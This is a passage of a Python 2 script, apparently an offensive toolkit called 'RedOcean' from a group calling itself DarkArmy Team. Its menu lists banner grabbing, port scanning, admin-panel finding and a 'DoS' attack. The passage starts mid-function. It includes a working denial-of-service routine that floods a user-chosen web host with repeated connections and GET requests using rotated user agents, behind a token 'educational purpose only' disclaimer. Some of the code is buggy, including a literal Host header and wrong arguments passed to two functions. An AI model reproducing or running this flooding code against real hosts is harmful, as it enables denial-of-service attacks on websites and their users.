	print '[*] Showing','[','\033[1;32;20m' ,target,'\033[1;35;20m' ,']', 'Banner:\n'
	s = socket.socket()
	s.settimeout(2)
	s.connect((target, 80))
	s.send('HEAD / HTTP/1.1\nHost: ' + target + '\n\n')
	print '\033[1;32;20m',s.recv(1024)
	s.close()
	sleep(3)
	data = raw_input('\033[1;35;20mPress [ENTER] to Continue.. ')
	if data == '':
		os.system('clear')
		main()
def DoS(host):
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	print('\033[1;32;20mThis is for educational purpose only!\n')
	print ('[*] Host to attack: ' + host)
	ip=socket.gethostbyname(host)
	print ('[*] IP of the host: ' + ip + '\n\n')
	conn=raw_input('Enter the number of packets to be sent(Default: 3000): ')
	conn=int(conn)
    
    
	for i in range(conn):
		try:
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		except:
			print ('Unable to create Socket. Retrying.')
			continue
		random_index = randrange(len(uagent))
		try:
			s.connect((ip, 80))
		except:
			print ('Unable To Connect. Retrying.')
			continue
		print ('\033[1;32;20m[*] Attacking..')
		s.send('GET / HTTP/1.1\r\n')
		s.send('Host: "+host+"\r\n')
		s.send('User-Agent: ' + uagent[random_index] + '\r\n\r\n')
		s.close()
	main()
def main():
	os.system('clear')
	banner = """

	###########################################################
	#  ____  ____  ____       _____  ___  ____    __    _  _  #
	# (  _ \( ___)(  _ \  ___(  _  )/ __)( ___)  /__\  ( \( ) #
	#  )   / )__)  )(_) )(___))(_)(( (__  )__)  /(__)\  )  (  #
	# (_)\_)(____)(____/     (_____)\___)(____)(__)(__)(_)\_) #
	#             \033[94m<--Coded by REGEX-->\033[1;31;20m                        #
	#                    \033[92m*DarkArmy Team*\033[1;31;20m                      #
	#      \033[1;37;20m@BETA Version|0.7|\033[1;31;20m                                 #
	###########################################################
	\033[1;32;20m[1] HTTP Banner          [6] Password Generator
	[2] DoS [\033[1;31;20mLITE\033[1;32;20m]           [7] \033[1;35;20m*Coming Soon*\033[1;32;20m
	[3] Subdomain Viewer
	[4] Find Admin Panel
	[5] Port Scan
	
	[0] \033[1;31;20mEXIT
												       """                                             
	print ("\033[1;31;20m\n" + banner)
	select = raw_input('\033[1;35;20mRedOcean> \033[1;32;20m')
	sleep(1)
	if select == '1':
		os.system('clear')
		print('\033[1;31;20m')
		os.system('figlet BannerGrab')
		print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		target = raw_input('\033[1;32;20m[HTTP Banner]\033[1;35;20mWeb Domain: ')
		sleep(1)
		os.system('clear')
		HTTPBanner(target)
	elif select == '2':
		os.system('clear')
		print('\033[1;31;20m')
		os.system('figlet DoS Attack')
		print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		target2 = raw_input('\033[1;32;20m[DoS]\033[1;35;20mWeb Domain: ')
		os.system('clear')
		DoS(target2)
	elif select == '3':
		os.system('clear')
		print('\033[1;31;20m')
		os.system('figlet Viewer')
		print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		target3 = raw_input('\033[1;32;20m[Subdomain Viewer]\033[1;35;20mWeb Domain: ')
		os.system('clear')
		Subdomain(target3)
	elif select == '4':
		target4 = os.system('clear')
		os.system('clear')
		findAdmin(target4)
	elif select == '5':
		os.system('clear')
		print('\033[1;31;20m')
		os.system('figlet Port Scan')
		print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		target5 = raw_input('\033[1;32;20m[Port Scan]\033[1;35;20mWeb Domain: ')
		scanner(target5)
		os.system('clear')
		main()
	elif select == '6':
		target6 = os.system('clear')
		passgen(target6)
	elif select == '7':
		os.system('clear')
		print('*Coming Soon*')
		sleep(2)
		os.system('clear')
		main()
	elif select > '7':
		os.system('clear')
		print('[?] Not Found..')
		sleep(2)
		os.system('clear')
		main()
	elif select == '0':
		os.system('clear')
if __name__=='__main__':
	main()
